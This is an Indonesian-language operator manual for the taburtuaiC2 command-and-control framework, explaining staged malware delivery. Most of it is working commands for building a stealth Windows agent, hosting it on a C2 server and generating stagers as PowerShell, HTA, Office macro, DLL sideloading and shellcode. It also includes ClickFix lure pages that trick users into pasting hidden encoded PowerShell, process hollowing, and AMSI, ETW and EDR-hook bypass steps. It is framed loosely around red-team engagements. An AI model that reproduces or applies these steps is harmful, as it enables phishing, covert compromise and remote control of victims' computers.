# Staged Delivery — Panduan Lengkap

**taburtuaiC2** · Versi 3.0 · Bahasa: Indonesia

> Dokumen ini menjelaskan konsep, arsitektur, dan langkah-langkah operasional untuk
> melakukan initial access menggunakan teknik **staged delivery** pada taburtuaiC2.

---

## Daftar Isi

| # | Bagian |
|---|--------|
| 1 | [Apa itu Staged Delivery?](#1-apa-itu-staged-delivery) |
| 2 | [Mengapa Staged Lebih Baik dari Stageless?](#2-mengapa-staged-lebih-baik-dari-stageless) |
| 3 | [Arsitektur Sistem](#3-arsitektur-sistem) |
| 4 | [Komponen yang Dibutuhkan](#4-komponen-yang-dibutuhkan) |
| 5 | [Persiapan Lingkungan](#5-persiapan-lingkungan) |
| 6 | [Workflow Staged — Step by Step](#6-workflow-staged--step-by-step) |
| 7 | [Format Output dan Kapan Menggunakannya](#7-format-output-dan-kapan-menggunakannya) |
| 8 | [Delivery Templates](#8-delivery-templates) |
| 9 | [OPSEC dan Penghindaran Deteksi](#9-opsec-dan-penghindaran-deteksi) |
| 10 | [Troubleshooting](#10-troubleshooting) |
| 11 | [Referensi Cepat](#11-referensi-cepat) |

---

## 1. Apa itu Staged Delivery?

### Konsep Dasar

Staged delivery adalah teknik di mana payload tidak dikirim sekaligus. Alih-alih langsung mengirim full agent (~10MB) ke target, kita mengirim **stager** kecil (~2MB) terlebih dahulu.

Stager hanya punya satu tugas: **menghubungi C2, mendownload agent asli, lalu mengeksekusinya di memori**.

```
STAGELESS (tradisional)
────────────────────────
Target ──→ [Full Agent 10MB]
           ├─ semua fitur ada di sini
           └─ langsung aktif

STAGED (modern)
────────────────────────
Target ──→ [Stager 2MB]
           └─ download dari C2
              └─ [Full Agent 10MB, terenkripsi]
                 └─ decrypt di memori
                    └─ eksekusi → aktif
```

### Analogi Sederhana

Bayangkan kamu mau menyelundupkan sesuatu melewati penjagaan. Daripada membawa semua barang sekaligus dan langsung ketahuan, kamu dulu kirim orang kecil yang tidak mencurigakan. Orang kecil itu baru ambil barang setelah lolos penjagaan.

Stager = orang kecil tidak mencurigakan.  
Full agent = barang yang diselundupkan.  
C2 server = titik pengambilan barang.

---

## 2. Mengapa Staged Lebih Baik dari Stageless?

### Perbandingan Langsung

| Aspek | Stageless | Staged |
|---|---|---|
| **Ukuran payload awal** | 8–15 MB | 1–3 MB |
| **Deteksi oleh AV disk scan** | Tinggi (full agent ada di disk) | Rendah (stager kecil, agent tidak pernah di disk) |
| **Deteksi oleh memory scan** | Tinggi (full agent langsung load) | Rendah (download terenkripsi, decrypt di memori) |
| **Analisis statis** | Mudah (semua string ada di binary) | Susah (stager minimal, tidak ada IOC agent) |
| **Fleksibilitas payload** | Tidak (harus rebuild binary) | Ya (ganti agent tanpa ganti stager) |
| **Butuh koneksi C2 saat eksekusi** | Tidak | Ya |
| **Cocok untuk** | Target tanpa AV/EDR, USB drop | Phishing, ClickFix, target berkeamanan tinggi |

### Kenapa Agent Tidak Ditulis ke Disk?

Saat stager mendownload agent, agent langsung dimuat ke memori dan dieksekusi. Ini disebut **fileless execution** atau **in-memory loading**. Keuntungannya:

- **AV tradisional tidak bisa scan** — AV berbasis file signature tidak akan menemukan agent karena tidak ada file di disk
- **Forensik lebih sulit** — setelah reboot, tidak ada artefak di disk
- **Bypass application whitelisting** — agent jalan dalam konteks proses lain yang sudah dipercaya

---

## 3. Arsitektur Sistem

### Diagram Alur Data

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  OPERATOR MACHINE (Linux/macOS/Windows)                                     │
│                                                                             │
│  1. Build agent EXE      → bin/agent_windows_stealth.exe                   │
│  2. Upload ke C2 server  → token: a1b2c3...                                │
│  3. Generate stager      → stager.ps1 / stager.exe / update.hta            │
│  4. Kirim ke target      → email / USB / ClickFix / web                    │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                                      │
                           Operator CLI (port 6000)
                                      │
┌─────────────────────────────────────▼───────────────────────────────────────┐
│  C2 SERVER (VPS / cloud)                                                    │
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  /api/v1/*        → Endpoint operator (butuh API key)               │   │
│  │  /beacon          → Endpoint agent (check-in, command poll)         │   │
│  │  /stage/:token    → Endpoint stager (download agent, satu kali)     │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  Database (SQLite):                                                         │
│  ┌──────────┐  ┌──────────────────────────────────┐  ┌─────────────────┐  │
│  │  agents  │  │  commands                        │  │  stages         │  │
│  │──────────│  │──────────────────────────────────│  │─────────────────│  │
│  │ id       │  │ id, agent_id, operation_type     │  │ token           │  │
│  │ hostname │  │ payload_json, status             │  │ payload (enc.)  │  │
│  │ username │  │ created_at, executed_at          │  │ format, arch    │  │
│  │ os, arch │  └──────────────────────────────────┘  │ expires_at      │  │
│  │ last_seen│                                         │ used, used_by   │  │
│  └──────────┘                                         └─────────────────┘  │
└─────────────────────────────────────────────────────────────────────────────┘
              │                                    │
         Agent beacon                      Stager download
         (tiap N detik)                   (satu kali, lalu token hangus)
              │                                    │
┌─────────────▼────────────────────────────────────▼─────────────────────────┐
│  TARGET MACHINE (Windows)                                                   │
│                                                                             │
│  stager.ps1 ─→ stager.exe ─→ download /stage/token ─→ decrypt di memori   │
│                                                         └─→ execute agent   │
│                                                              └─→ beacon ──→ │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Enkripsi dan Keamanan

Semua komunikasi diproteksi berlapis:

```
Layer 1: Token = 32 karakter hex random (128-bit entropy)
          → Siapa pun yang tidak tahu token tidak bisa download stage
          → Token hangus setelah pertama kali didownload (one-shot)

Layer 2: Payload disimpan terenkripsi AES-256-GCM di database
          → Kalau database bocor, agent tetap tidak bisa dibaca
          → Server decrypt sebelum serve, menggunakan ENCRYPTION_KEY

Layer 3: Agent ↔ C2 communication
          → Setiap payload dienkripsi AES-256-GCM dengan key yang di-bake ke agent
```

---

## 4. Komponen yang Dibutuhkan

### Software

| Komponen | Kebutuhan | Keterangan |
|---|---|---|
| Go 1.21+ | **Wajib** | Build semua binary |
| `make` | **Wajib** | Build agent dengan Makefile |
| VPS/server publik | **Wajib** | C2 server harus bisa diakses target |
| `garble` | Opsional | Obfuskasi binary (anti-reversing) |
| `mingw-w64` | Opsional | Build DLL format (sideloading) |
| `donut` | Opsional | Konversi EXE → shellcode (ps1-mem format) |

### Port yang Harus Terbuka di Server

| Port | Fungsi |
|---|---|
| `6000` (atau pilihan kamu) | C2 communication (agent beacon + operator CLI) |
| `22` | SSH ke server untuk manage |

### Struktur Direktori Penting

```
taburtuaiC2/
├── bin/                          ← Semua binary hasil build
│   ├── server                    ← C2 server
│   ├── operator                  ← Operator CLI
│   ├── generate                  ← Implant builder
│   └── agent_windows_stealth.exe ← Agent Windows
├── cmd/
│   ├── server/   ← Source C2 server
│   ├── operator/ ← Source operator CLI
│   ├── generate/ ← Source implant builder
│   └── stager/   ← Source binary stager
├── agent/        ← Source agent Windows/Linux/macOS
├── docs/         ← Dokumentasi (di sini kamu membaca)
└── Makefile      ← Build system
```

---

## 5. Persiapan Lingkungan

### 5.1 Build Semua Binary

Lakukan satu kali di awal, atau setiap kali ada update kode:

```bash
# Clone dan masuk ke direktori
cd taburtuaiC2/

# Download dependensi Go
go mod download && go mod tidy

# Build semuanya sekaligus
make all

# Atau build individual:
make server    # → bin/server
make operator  # → bin/operator
make generate  # → bin/generate
```

### 5.2 Build Agent

Agent dikompilasi dengan konfigurasi yang di-bake langsung ke binary. Pastikan nilai-nilai ini **konsisten** dengan server:

```bash
# Stealth build (no console, stripped, untuk engagement nyata)
make agent-win-stealth \
  C2_SERVER=http://IP_SERVER_KAMU:6000 \
  ENC_KEY=KEY_16_KARAKTER \
  INTERVAL=30 \
  JITTER=20

# Contoh nyata:
make agent-win-stealth \
  C2_SERVER=http://172.23.0.212:6000 \
  ENC_KEY=0p53x123ABCD1234 \
  INTERVAL=60 \
  JITTER=30

# Output: bin/agent_windows_stealth.exe
```

> **Penting:** `ENC_KEY` harus sama antara server (`ENCRYPTION_KEY`) dan agent (`ENC_KEY`). Kalau beda, agent tidak bisa decrypt command dari server.

### 5.3 Konfigurasi Variabel

| Variabel | Penjelasan | Rekomendasi |
|---|---|---|
| `C2_SERVER` | URL lengkap server | Gunakan domain, bukan IP (lebih OPSEC) |
| `ENC_KEY` | Kunci AES-256 | 16-32 karakter, random, simpan baik-baik |
| `INTERVAL` | Frekuensi beacon (detik) | 30-300 tergantung situasi |
| `JITTER` | Variasi interval (%) | 20-40% untuk hindari pola reguler |
| `KILL_DATE` | Tanggal agent mati otomatis | Isi sesuai timeline engagement |

---

## 6. Workflow Staged — Step by Step

> Ini adalah alur utama dari nol sampai agent aktif di target.

---

### Step 1 — Jalankan Server C2

Server adalah otak dari sistem. Harus jalan pertama kali.

```bash
# Di Linux server (sebaiknya pakai screen/tmux agar tidak mati saat terminal ditutup)
screen -S c2server

ENCRYPTION_KEY=0p53x123ABCD1234 ./bin/server --port 6000
```

**Apa yang terjadi:**
Server mulai listen di port 6000. Semua endpoint (agent, operator, stage) aktif. Database SQLite dibuat otomatis di `./data/taburtuai.db`.

**Verifikasi server jalan:**
```bash
curl http://172.23.0.212:6000/api/v1/health
# Response: {"success":true,"message":"OK"}
```

> **Catatan:** `ENCRYPTION_KEY` ini digunakan server untuk enkripsi stage payload di database. Harus sama dengan `--key` saat generate stager nanti.

---

### Step 2 — Build Agent

Kompilasi agent dengan konfigurasi yang menunjuk ke server kamu:

```bash
# Build stealth agent (untuk engagement nyata)
make agent-win-stealth \
  C2_SERVER=http://172.23.0.212:6000 \
  ENC_KEY=0p53x123ABCD1234 \
  INTERVAL=60 \
  JITTER=30 \
  KILL_DATE=2026-12-31

# Output: bin/agent_windows_stealth.exe
```

**Kenapa perlu ini terpisah dari stager?**

Stager dan agent adalah dua binary berbeda:
- **Stager** = downloader kecil, tidak berisi fitur C2. Hanya tau cara download dan decrypt dari satu URL.
- **Agent** = binary utama dengan semua fitur C2 (inject, creds, evasion, dll). Ini yang diupload ke server sebagai "stage".

Analoginya: stager = kurir, agent = paket yang dikirim.

---

### Step 3 — Upload Agent ke Stage Server

Ini adalah langkah yang **paling sering dilewati** dan menyebabkan error 404.

Token tidak dibuat manual. Token dihasilkan server saat kamu upload payload.

```bash
./bin/operator stage upload ./bin/agent_windows_stealth.exe \
  --server http://172.23.0.212:6000 \
  --format exe \
  --arch amd64 \
  --ttl 48 \
  --desc "engagement Q2-2026"
```

**Penjelasan flag:**

| Flag | Nilai | Keterangan |
|---|---|---|
| `--server` | URL C2 server | Operator perlu tau ke mana koneksi |
| `--format` | `exe` | Tipe payload (exe untuk agent biasa) |
| `--arch` | `amd64` | Arsitektur target (amd64 untuk 64-bit Windows) |
| `--ttl` | `48` | Berapa jam stage ini valid. Setelah itu token otomatis hangus |
| `--desc` | teks bebas | Label untuk identifikasi di `stage list` |

**Output yang akan muncul:**
```
[+] Stage uploaded (9842512 bytes)
    Token    : 3a8f91c2d4b5e607f8091a2b3c4d5e6f  ← SALIN INI
    Stage URL: http://172.23.0.212:6000/stage/3a8f91c2d4b5e607f8091a2b3c4d5e6f
    Expires  : 2026-04-24T12:00:00Z
```

**Apa yang terjadi di balik layar:**
1. Operator CLI kirim agent binary ke `/api/v1/stage` (terautentikasi)
2. Server **enkripsi** agent dengan AES-256-GCM menggunakan `ENCRYPTION_KEY`
3. Ciphertext disimpan di database dengan token random 32 hex
4. Token dikembalikan ke operator — inilah satu-satunya cara akses payload

> **Simpan token ini.** Token hanya ditampilkan sekali saat upload. Kalau lupa, cek dengan `stage list`.

---

### Step 4 — Generate Stager

Sekarang baru generate stager, menggunakan token dari step 3:

```bash
./bin/generate stager \
  --server http://172.23.0.212:6000 \
  --token 3a8f91c2d4b5e607f8091a2b3c4d5e6f \
  --key 0p53x123ABCD1234 \
  --format ps1 \
  --exec-method drop \
  --output stager.ps1
```

**Penjelasan flag:**

| Flag | Nilai | Keterangan |
|---|---|---|
| `--server` | URL C2 | Stager harus tau dari mana download agent |
| `--token` | Token dari step 3 | Alamat spesifik payload di server |
| `--key` | Encryption key | Harus sama dengan `ENCRYPTION_KEY` di server |
| `--format` | `ps1` | Format output stager (lihat [Section 7](#7-format-output-dan-kapan-menggunakannya)) |
| `--exec-method` | `drop` | Cara agent dieksekusi setelah didownload |
| `--output` | nama file | Nama file output |

**Apa yang terjadi:**
1. Generator kompilasi binary stager (`cmd/stager/main.go`) dengan konfigurasi yang di-bake
2. Stager binary di-embed ke dalam PS1 wrapper sebagai base64
3. PS1 file siap dikirim ke target

---

### Step 5 — Verifikasi Stage di Server

Sebelum deploy, pastikan stage ada di server:

```bash
./bin/operator stage list --server http://172.23.0.212:6000
```

```
TOKEN                              FORMAT  ARCH    USED    DESCRIPTION
────────────────────────────────────────────────────────────────────────
3a8f91c2d4b5e607f8091a2b3c4d5e6f  exe     amd64   no      engagement Q2-2026
```

Kolom `USED` harus `no`. Kalau sudah `yes`, berarti stager sudah pernah download payload dan token sudah hangus — perlu upload ulang (Step 3) dan generate stager baru (Step 4).

---

### Step 6 — Delivery ke Target

Kirimkan `stager.ps1` ke target. Ada banyak cara:

**Cara A — Jalankan langsung (lab/test):**
```powershell
# Di mesin Windows target
powershell -ExecutionPolicy Bypass -File .\stager.ps1
```

**Cara B — One-liner (phishing, ClickFix):**
```powershell
# Encode PS1 ke base64 dulu
$content = Get-Content .\stager.ps1 -Raw
$bytes = [System.Text.Encoding]::Unicode.GetBytes($content)
$b64 = [System.Convert]::ToBase64String($bytes)
Write-Host "powershell -w hidden -ep bypass -enc $b64"

# Perintah hasil encode itulah yang dipakai untuk delivery
```

**Cara C — Via ClickFix template:**
```bash
# Generator otomatis buat halaman ClickFix
./bin/generate template clickfix \
  --stager ./stager.ps1 \
  --lure "browser-verification" \
  --output delivery.html
```
Buka `delivery.html` di browser untuk lihat hasilnya.

---

### Step 7 — Apa yang Terjadi di Target

Setelah target menjalankan `stager.ps1`:

```
stager.ps1 dieksekusi
  │
  ├─ [embed] Extract stager.exe dari base64 ke %TEMP%\random.exe
  │
  └─ Jalankan %TEMP%\random.exe (hidden window)
       │
       ├─ [anti-sandbox] Tunggu jitter seconds (kalau dikonfigurasi)
       │
       ├─ [download] GET http://172.23.0.212:6000/stage/3a8f91c...
       │     └─ Server decrypt payload → kirim plaintext agent binary
       │
       ├─ [execute] Eksekusi agent sesuai exec-method:
       │     ├─ drop    → tulis ke %TEMP%\*.exe → CreateProcess
       │     ├─ hollow  → buat svchost.exe suspended → replace memory → resume
       │     └─ thread  → VirtualAlloc(RWX) → CreateThread (butuh shellcode)
       │
       └─ [beacon] Agent aktif → kirim check-in ke http://172.23.0.212:6000/beacon
            └─ Operator bisa connect
```

**Kenapa token hangus setelah didownload?**

Ini disebut **one-shot token**. Setelah stager berhasil download, token di-mark `used` dan tidak bisa digunakan lagi. Tujuannya:
- Kalau defender menemukan URL stage, mereka tidak bisa download ulang
- Membatasi eksposur payload
- Memaksa operator generate token baru untuk setiap deployment

---

### Step 8 — Verifikasi Agent Masuk

```bash
# Cek agent list
./bin/operator agents list --server http://172.23.0.212:6000
```

```
ID                                    HOSTNAME      USERNAME  OS             LAST SEEN     STATUS
3b4c5d6e-7f8a-9b0c-1d2e-3f4a5b6c7d8e CORP-PC01     jdoe      windows/amd64  2 seconds ago active
```

Kalau agent muncul, deployment berhasil. Lanjutkan dengan operasi:

```bash
# Buka interactive shell
./bin/operator shell 3b4c5d6e --server http://172.23.0.212:6000

[shell 3b4c5d6e] > whoami
CORP\jdoe

[shell 3b4c5d6e] > hostname
CORP-PC01
```

---

## 7. Format Output dan Kapan Menggunakannya

Format menentukan **bagaimana stager dikemas** untuk dikirim ke target. Pemilihan format bergantung pada skenario serangan.

### Ringkasan Format

| Format | File | Stage harus berisi | Execution | Kapan digunakan |
|---|---|---|---|---|
| `exe` | `.exe` | EXE agent | Langsung run | Lab, USB drop, file share |
| `ps1` | `.ps1` | EXE agent | Drop ke %TEMP% + run | Phishing, ClickFix, macro |
| `ps1-mem` | `.ps1` | **Shellcode** | In-memory VirtualAlloc | Target dengan AV ketat |
| `hta` | `.hta` | EXE agent | Drop + run via VBScript | Browser-delivered attack |
| `vba` | `.bas` | EXE agent | Download + run via XMLHTTP | Office macro attack |
| `cs` | `.cs` | **Shellcode** | In-memory via PInvoke | Target dengan .NET available |
| `shellcode` | `.bin` | EXE agent | sRDI conversion | Inject ke proses lain |
| `dll` | `.dll` | EXE agent | DllMain sideloading | DLL hijacking scenario |

### Detail Per Format

#### `exe` — Binary Stager Langsung

```bash
./bin/generate stager \
  --server http://172.23.0.212:6000 \
  --token TOKEN \
  --key KEY \
  --format exe \
  --exec-method drop \
  --output stager.exe
```

**Cocok untuk:** Test di lab, USB drop ke target yang tidak aware, deployment via file share internal.

**Cara run di target:**
```
Dobel-klik stager.exe
```
atau
```cmd
stager.exe
```

**Cara kerjanya:**
Stager binary murni. Langsung download agent dari C2, decrypt, execute. Tidak ada wrapper.

---

#### `ps1` — PowerShell Wrapper (Paling Sering Dipakai)

```bash
./bin/generate stager \
  --server http://172.23.0.212:6000 \
  --token TOKEN \
  --key KEY \
  --format ps1 \
  --exec-method drop \
  --output stager.ps1
```

**Cocok untuk:** Phishing (attachment PS1), ClickFix (Win+R paste), shortcut LNK yang panggil powershell.

**Cara run di target:**
```powershell
# Cara 1 - file
powershell -ep bypass -file stager.ps1

# Cara 2 - encoded (untuk Win+R atau satu baris)
powershell -w hidden -ep bypass -enc BASE64_DARI_PS1
```

**Cara kerjanya:**
PS1 berisi stager.exe yang di-encode base64. PS1 extract binary ke `%TEMP%`, jalankan hidden, binary download agent dari C2.

---

#### `ps1-mem` — In-Memory Shellcode Runner

```bash
# PERHATIAN: Stage harus berisi shellcode, BUKAN EXE
# Konversi agent ke shellcode dulu dengan donut:
donut -i bin/agent_windows_stealth.exe -o agent.bin -a 2

# Upload shellcode sebagai stage
./bin/operator stage upload agent.bin \
  --server http://172.23.0.212:6000 \
  --format shellcode

# Baru generate ps1-mem
./bin/generate stager \
  --server http://172.23.0.212:6000 \
  --token TOKEN_DARI_SHELLCODE \
  --key KEY \
  --format ps1-mem \
  --output stager.ps1
```

**Cocok untuk:** Target dengan AV yang scan file di disk. PS1 download shellcode dan langsung execute di memori tanpa pernah tulis ke disk.

**PENTING:** `ps1-mem` butuh payload shellcode (`.bin`), bukan EXE. Kalau kamu upload EXE sebagai stage dan pakai ps1-mem, hasilnya crash.

---

#### `hta` — HTML Application

```bash
./bin/generate stager \
  --server http://172.23.0.212:6000 \
  --token TOKEN \
  --key KEY \
  --format hta \
  --output update.hta
```

**Cocok untuk:** Phishing via email dengan attachment HTA, fake "browser update" page.

**Cara run di target:**
Dobel-klik file `.hta` → Windows buka dengan `mshta.exe` → VBScript jalan → drop + run stager.

---

#### `vba` — Office Macro

```bash
./bin/generate stager \
  --server http://172.23.0.212:6000 \
  --token TOKEN \
  --key KEY \
  --format vba \
  --output macro.bas
```

**Cocok untuk:** Phishing via dokumen Office (Word/Excel) dengan macro.

**Cara deploy:**
1. Buka Word/Excel baru
2. `Alt+F11` → Insert Module → paste isi `macro.bas`
3. Simpan sebagai `.docm` / `.xlsm`
4. Kirim ke target

Macro download agent dari URL C2, simpan ke `%TEMP%`, jalankan.

---

#### `shellcode` — Binary ke Shellcode (sRDI)

```bash
./bin/generate stager \
  --server http://172.23.0.212:6000 \
  --token TOKEN \
  --key KEY \
  --format shellcode \
  --output stager.bin
```

**Cocok untuk:** Injection ke proses lain. Output `.bin` bisa dipakai dengan:
- `inject remote` ke proses existing
- Diembed di loader custom
- Dipakai sebagai payload BOF

Generator mencoba donut (kalau ada di PATH), fallback ke built-in sRDI stub.

---

#### `dll` — DLL untuk Sideloading

```bash
# Butuh mingw-w64 terinstall
./bin/generate stager \
  --server http://172.23.0.212:6000 \
  --token TOKEN \
  --key KEY \
  --format dll \
  --output version.dll
```

**Cocok untuk:** DLL sideloading. Letakkan `version.dll` di folder yang sama dengan aplikasi yang biasa load `version.dll` (banyak aplikasi melakukan ini).

Saat aplikasi load DLL, `DllMain` otomatis dipanggil dan menjalankan stager.

---

## 8. Delivery Templates

Template adalah halaman/file yang dipakai untuk menipu target agar menjalankan stager.

### ClickFix

Teknik rekayasa sosial yang sangat efektif. Target melihat halaman web yang tampak seperti error browser, diminta "verify" dengan menjalankan perintah.

```bash
./bin/generate template clickfix \
  --stager ./stager.ps1 \
  --lure "browser-verification" \
  --output delivery.html
```

**Alur di mata target:**
```
Target buka delivery.html
  → Muncul halaman "Verify you are human"
  → Ada tombol "I'm not a robot"
  → Klik tombol → perintah PowerShell ter-copy ke clipboard
  → Halaman minta: "Press Win+R, paste, Enter"
  → Target lakukan → stager.ps1 jalan
```

**Alur teknis:**
```
delivery.html
  └─ navigator.clipboard.writeText(base64_encoded_powershell)
     └─ "powershell -w hidden -ep bypass -enc BASE64"
        └─ Decode BASE64 → stager.ps1
           └─ Execute stager
```

**Lure options (--lure):**
- `browser-verification` → Tampilan verifikasi browser
- `captcha-check` → CAPTCHA palsu
- `security-update` → Update keamanan palsu
- Teks bebas → Judul halaman kustom

---

## 9. OPSEC dan Penghindaran Deteksi

### 9.1 Pilih Exec Method yang Tepat

Exec method menentukan **bagaimana agent dieksekusi** setelah didownload:

| Method | Cara Kerja | AV/EDR Risk | Kapan Pakai |
|---|---|---|---|
| `drop` | Tulis EXE ke %TEMP%, CreateProcess | Medium (ada file di disk) | Test, target AV lemah |
| `hollow` | Spawn svchost.exe suspended, hollow memory, resume | Low (proses legitimate) | Target dengan EDR |
| `thread` | VirtualAlloc(RWX) + CreateThread (butuh shellcode) | High (RWX memory) | Tidak direkomendasikan |

Untuk engagement nyata, gunakan `hollow`:

```bash
./bin/generate stager \
  --server http://172.23.0.212:6000 \
  --token TOKEN \
  --key KEY \
  --format ps1 \
  --exec-method hollow \
  --output stager.ps1
```

### 9.2 Interval dan Jitter

Jangan gunakan interval tetap — pola regular mudah terdeteksi:

```bash
# Jangan: interval 30 detik tepat (detectable pattern)
# Lakukan: interval 60 detik dengan jitter 30%
# Artinya: beacon setiap 42-78 detik (random dalam range itu)

make agent-win-stealth \
  INTERVAL=60 \
  JITTER=30
```

### 9.3 Kill Date

Selalu set kill date — agent berhenti operasi otomatis setelah engagement selesai:

```bash
make agent-win-stealth \
  KILL_DATE=2026-06-30    # Agent mati sendiri 30 Juni 2026
```

### 9.4 TTL Stage yang Tepat

Jangan biarkan stage terlalu lama:

```bash
# Untuk engagement dengan window delivery 1 hari
./bin/operator stage upload agent.exe --ttl 24

# Untuk phishing campaign 3 hari
./bin/operator stage upload agent.exe --ttl 72

# Hapus manual kalau tidak jadi dipakai
./bin/operator stage delete TOKEN
```

### 9.5 Setelah Agent Masuk — Urutan OPSEC

Setelah agent pertama kali connect, lakukan ini sebelum operasi apapun:

```bash
# 1. Cek apakah kita dianalisis
./bin/operator opsec antidebug AGENT_ID --wait
./bin/operator opsec antivm AGENT_ID --wait

# 2. Hilangkan EDR hooks
./bin/operator evasion unhook AGENT_ID --wait

# 3. Matikan AMSI dan ETW
./bin/operator bypass amsi AGENT_ID --wait
./bin/operator bypass etw AGENT_ID --wait

# 4. Baru lakukan operasi
./bin/operator shell AGENT_ID
```

---

## 10. Troubleshooting

### Error: 404 saat stager download

**Gejala di server log:**
```
[WARN] [AUDIT] GET /stage/TOKEN 404
```

**Penyebab:**
- Token tidak pernah diupload (`stage upload` belum dilakukan)
- Token salah ketik
- Token sudah hangus karena TTL habis
- Token sudah `used` (didownload sebelumnya)

**Solusi:**
```bash
# Cek status stage
./bin/operator stage list --server http://IP:PORT

# Kalau tidak ada, upload ulang
./bin/operator stage upload ./bin/agent.exe \
  --server http://IP:PORT \
  --ttl 24

# Generate stager baru dengan token baru
./bin/generate stager --token TOKEN_BARU ...
```

---

### Error: Agent tidak muncul setelah stager jalan

**Langkah debug:**

1. **Cek server bisa diakses dari target:**
   ```powershell
   # Di mesin target
   Test-NetConnection -ComputerName 172.23.0.212 -Port 6000
   ```

2. **Cek firewall di server:**
   ```bash
   # Di server Linux
   sudo ufw allow 6000/tcp
   # atau
   sudo iptables -A INPUT -p tcp --dport 6000 -j ACCEPT
   ```

3. **Jalankan stager dengan output visible:**
   ```powershell
   # Di PowerShell yang tidak hidden untuk lihat error
   powershell -ep bypass -file stager.ps1
   ```

4. **Cek log server:**
   ```bash
   ./bin/operator logs --server http://IP:PORT --limit 20 --level ERROR
   ```

---

### Error: `ps1-mem` crash atau tidak ada efek

**Penyebab:** Stage yang diupload adalah EXE, bukan shellcode.

`ps1-mem` melakukan `VirtualAlloc(RWX) + CreateThread` yang hanya berfungsi dengan raw shellcode (bytes yang langsung bisa dieksekusi sebagai machine code). EXE binary tidak bisa dieksekusi dengan cara ini.

**Solusi 1 — Gunakan format lain:**
```bash
# Pakai ps1 biasa (lebih kompatibel)
./bin/generate stager --format ps1 --exec-method drop ...
```

**Solusi 2 — Convert EXE ke shellcode dulu:**
```bash
# Butuh donut terinstall
donut -i bin/agent_windows_stealth.exe -o agent_shellcode.bin -a 2

# Upload shellcode sebagai stage
./bin/operator stage upload agent_shellcode.bin \
  --format shellcode \
  --server http://IP:PORT

# Generate ps1-mem dengan token dari shellcode stage
./bin/generate stager --format ps1-mem --token TOKEN_SHELLCODE ...
```

---

### Error: `enc key mismatch` atau agent tidak bisa decrypt command

**Penyebab:** `ENC_KEY` saat build agent berbeda dengan `ENCRYPTION_KEY` di server.

```bash
# Server pakai:
ENCRYPTION_KEY=0p53x123ABCD1234 ./bin/server

# Agent harus dikompilasi dengan key yang sama:
make agent-win-stealth ENC_KEY=0p53x123ABCD1234
```

Kalau sudah terlanjur berbeda, build ulang agent dengan key yang benar.

---

### Error: Stage token expired (410 Gone)

**Gejala:**
```
stage server returned 410
```

TTL stage sudah habis. Server otomatis hapus stage yang expired.

**Solusi:**
```bash
# Upload ulang dengan TTL lebih panjang
./bin/operator stage upload ./bin/agent.exe \
  --ttl 72 \
  --server http://IP:PORT

# Generate stager baru
./bin/generate stager --token TOKEN_BARU ...
```

---

## 11. Referensi Cepat

### Command Cheatsheet

```bash
# ─── SERVER ──────────────────────────────────────────────────────────
ENCRYPTION_KEY=KEY ./bin/server --port PORT

# ─── BUILD AGENT ─────────────────────────────────────────────────────
make agent-win-stealth \
  C2_SERVER=http://IP:PORT \
  ENC_KEY=KEY \
  INTERVAL=60 \
  JITTER=30 \
  KILL_DATE=YYYY-MM-DD

# ─── STAGE MANAGEMENT ────────────────────────────────────────────────
# Upload
./bin/operator stage upload FILE \
  --server http://IP:PORT \
  --format exe \
  --arch amd64 \
  --ttl 48 \
  --desc "DESKRIPSI"

# List
./bin/operator stage list --server http://IP:PORT

# Hapus
./bin/operator stage delete TOKEN --server http://IP:PORT

# ─── GENERATE STAGER ─────────────────────────────────────────────────
./bin/generate stager \
  --server http://IP:PORT \
  --token TOKEN \
  --key KEY \
  --format FORMAT \
  --exec-method METHOD \
  --output OUTPUT_FILE

# ─── OPERATOR ────────────────────────────────────────────────────────
# List agent
./bin/operator agents list --server http://IP:PORT

# Interactive shell
./bin/operator shell AGENT_ID --server http://IP:PORT --timeout 180

# OPSEC sequence (jalankan setelah agent pertama connect)
./bin/operator opsec antidebug AGENT_ID --wait
./bin/operator opsec antivm AGENT_ID --wait
./bin/operator evasion unhook AGENT_ID --wait
./bin/operator bypass amsi AGENT_ID --wait
./bin/operator bypass etw AGENT_ID --wait
```

---

### Format Selector

```
Target punya AV/EDR?
├── TIDAK → pakai: exe, ps1
└── YA
    ├── AV saja (tanpa EDR) → pakai: ps1 + exec-method hollow
    ├── EDR aktif → pakai: ps1-mem (butuh shellcode) atau dll (sideloading)
    └── EDR ketat + memory scan → pakai: stomp injection setelah agent masuk

Delivery channel?
├── Email attachment → ps1, hta, vba (macro)
├── Web / ClickFix → ps1 via template clickfix
├── USB drop → exe langsung
├── Office document → vba macro
└── DLL hijacking → dll format
```

---

### Checklist Sebelum Deployment

```
□ Server running dan bisa diakses dari internet
□ Agent dikompilasi dengan C2_SERVER dan ENC_KEY yang benar
□ Stage sudah diupload (bukan token manual!)
□ Token dari stage list menunjukkan USED = no
□ Stager di-generate dengan token yang benar dan key yang sama
□ Test stager di lab dulu sebelum kirim ke target
□ Kill date sudah di-set sesuai scope engagement
□ TTL stage cukup untuk window delivery
```

---

*Untuk detail teknis operasional lainnya (injection, credential access, lateral movement), lihat [WIKI.md](WIKI.md).*

*Untuk detail format implant lainnya, lihat [IMPLANT.md](IMPLANT.md).*
